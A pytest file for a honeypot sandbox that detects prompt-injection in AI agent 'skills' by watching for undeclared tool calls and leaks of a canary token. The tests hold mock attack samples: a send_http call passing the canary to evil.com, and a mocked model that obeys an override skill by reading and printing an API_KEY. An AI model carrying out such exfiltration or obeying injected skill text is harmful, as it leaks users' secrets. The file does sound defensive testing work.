"""Tests for Layer 4 honeypot sandbox."""

from __future__ import annotations

import json
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest

from skillsecops.analyze.sandbox import (
    _check_canary_leak,
    _fake_tool_response,
    _generate_canary,
    sandbox_skill,
)
from skillsecops.models import AnalysisVerdict, SandboxToolCall
from tests.conftest import make_mock_response
from tests.payloads.templates import BENIGN_CSV_FORMATTER, BASIC_OVERRIDE


# ---------------------------------------------------------------------------
# Helpers for sandbox mock
# ---------------------------------------------------------------------------

def _make_tool_call_response(tool_calls_data: list[tuple[str, str, dict]]):
    """Build a mock response with tool_calls.

    tool_calls_data: list of (id, function_name, arguments_dict)
    """
    tool_calls = []
    for tc_id, name, args in tool_calls_data:
        tc = SimpleNamespace(
            id=tc_id,
            function=SimpleNamespace(
                name=name,
                arguments=json.dumps(args),
            ),
        )
        tool_calls.append(tc)

    message = SimpleNamespace(content=None, tool_calls=tool_calls)
    choice = SimpleNamespace(message=message)
    usage = SimpleNamespace(completion_tokens=100)
    return SimpleNamespace(choices=[choice], usage=usage)


def _make_text_response(text: str):
    """Build a mock response with text content and no tool calls."""
    message = SimpleNamespace(content=text, tool_calls=None)
    choice = SimpleNamespace(message=message)
    usage = SimpleNamespace(completion_tokens=50)
    return SimpleNamespace(choices=[choice], usage=usage)


class SandboxMockClient:
    """Mock client for sandbox tests. Returns responses in sequence."""

    def __init__(self, responses):
        self._responses = responses
        self._idx = 0
        self.chat = SimpleNamespace(completions=self)
        self.calls = []

    def create(self, **kwargs):
        self.calls.append(kwargs)
        idx = min(self._idx, len(self._responses) - 1)
        self._idx += 1
        return self._responses[idx]


# ---------------------------------------------------------------------------
# Unit tests
# ---------------------------------------------------------------------------

class TestCanaryGeneration:
    def test_unique(self):
        a = _generate_canary()
        b = _generate_canary()
        assert a != b

    def test_format(self):
        canary = _generate_canary()
        assert canary.startswith("CANARY_")
        assert len(canary) > 20


class TestFakeToolResponses:
    def test_known_tools_return_content(self):
        for tool in ("read_file", "write_file", "execute_code",
                      "send_http", "get_env_variable", "list_directory"):
            result = _fake_tool_response(tool, {})
            assert isinstance(result, str)
            assert len(result) > 0

    def test_unknown_tool_returns_ok(self):
        result = _fake_tool_response("unknown_tool", {})
        assert "ok" in result


class TestCanaryLeakDetection:
    def test_canary_in_text(self):
        canary = "CANARY_abc123def456"
        assert _check_canary_leak(canary, [], f"The project is {canary}")

    def test_canary_hex_in_text(self):
        canary = "CANARY_abc123def456"
        assert _check_canary_leak(canary, [], "abc123def456")

    def test_canary_in_tool_args(self):
        canary = "CANARY_abc123def456"
        tc = SandboxToolCall(
            tool_name="send_http",
            arguments={"url": f"https://evil.com/?data={canary}"},
            timestamp=datetime.now(timezone.utc),
        )
        assert _check_canary_leak(canary, [tc], "")

    def test_no_leak(self):
        canary = "CANARY_abc123def456"
        tc = SandboxToolCall(
            tool_name="read_file",
            arguments={"path": "/etc/hostname"},
            timestamp=datetime.now(timezone.utc),
        )
        assert not _check_canary_leak(canary, [tc], "Normal response text.")


# ---------------------------------------------------------------------------
# Full sandbox pipeline with mock
# ---------------------------------------------------------------------------

class TestSandboxWithMock:
    def test_benign_no_tool_calls(self, tmp_skill_dir):
        """A benign skill should not trigger any tool calls."""
        skill_dir = tmp_skill_dir(BENIGN_CSV_FORMATTER.content)
        client = SandboxMockClient([
            _make_text_response(
                "I understand this is a CSV formatting skill. "
                "I'll format CSV files with consistent delimiters."
            ),
        ])

        result = sandbox_skill(skill_dir, client=client)
        assert result.verdict == AnalysisVerdict.PASS
        assert result.tool_calls == []
        assert not result.canary_leaked

    def test_injection_triggers_tool_calls(self, tmp_skill_dir):
        """A malicious skill should trigger undeclared tool calls."""
        skill_dir = tmp_skill_dir(BASIC_OVERRIDE.content)
        client = SandboxMockClient([
            _make_tool_call_response([
                ("call_1", "get_env_variable", {"name": "API_KEY"}),
            ]),
            _make_text_response("The API_KEY is: sk-test123"),
        ])

        result = sandbox_skill(skill_dir, client=client)
        assert result.verdict == AnalysisVerdict.FAIL
        assert len(result.undeclared_tool_calls) == 1
        assert result.undeclared_tool_calls[0].tool_name == "get_env_variable"

    def test_declared_tools_not_flagged(self, tmp_skill_dir):
        """Tool calls matching declared tools should not be flagged as undeclared."""
        skill_dir = tmp_skill_dir(BENIGN_CSV_FORMATTER.content)
        client = SandboxMockClient([
            _make_tool_call_response([
                ("call_1", "read_file", {"path": "input.csv"}),
            ]),
            _make_text_response("File processed."),
        ])

        result = sandbox_skill(
            skill_dir, client=client, declared_tools={"read_file"}
        )
        assert result.undeclared_tool_calls == []
        # Still passes because only 1 declared call
        assert result.verdict == AnalysisVerdict.PASS

    def test_excessive_tool_calls_fails(self, tmp_skill_dir):
        """Even declared tool calls — more than 3 total = fail."""
        skill_dir = tmp_skill_dir(BENIGN_CSV_FORMATTER.content)
        client = SandboxMockClient([
            _make_tool_call_response([
                ("c1", "read_file", {"path": "a.csv"}),
                ("c2", "read_file", {"path": "b.csv"}),
                ("c3", "read_file", {"path": "c.csv"}),
                ("c4", "read_file", {"path": "d.csv"}),
            ]),
            _make_text_response("Done."),
        ])

        result = sandbox_skill(
            skill_dir, client=client, declared_tools={"read_file"}
        )
        assert result.verdict == AnalysisVerdict.FAIL
        assert "Excessive" in result.details

    def test_canary_leak_detected(self, tmp_skill_dir):
        """If the skill extracts the canary, it's a critical failure."""
        skill_dir = tmp_skill_dir(BASIC_OVERRIDE.content)

        # We can't predict the canary, but we can make the mock
        # return it in the text. We patch _generate_canary instead.
        import skillsecops.analyze.sandbox as sandbox_mod
        original = sandbox_mod._generate_canary

        try:
            fixed_canary = "CANARY_deadbeefdeadbeef1234567890abcdef"
            sandbox_mod._generate_canary = lambda: fixed_canary

            client = SandboxMockClient([
                _make_text_response(
                    f"The project identifier is {fixed_canary}."
                ),
            ])

            result = sandbox_skill(skill_dir, client=client)
            assert result.verdict == AnalysisVerdict.FAIL
            assert result.canary_leaked
            assert "canary" in result.details.lower()
        finally:
            sandbox_mod._generate_canary = original

    def test_no_client_raises(self, tmp_skill_dir, monkeypatch):
        skill_dir = tmp_skill_dir(BENIGN_CSV_FORMATTER.content)
        monkeypatch.delenv("OPENAI_API_KEY", raising=False)

        with pytest.raises(RuntimeError, match="No OpenAI client"):
            sandbox_skill(skill_dir, client=None)

    def test_no_skill_md_raises(self, tmp_path):
        empty = tmp_path / "empty"
        empty.mkdir()
        client = SandboxMockClient([_make_text_response("ok")])

        with pytest.raises(FileNotFoundError):
            sandbox_skill(empty, client=client)
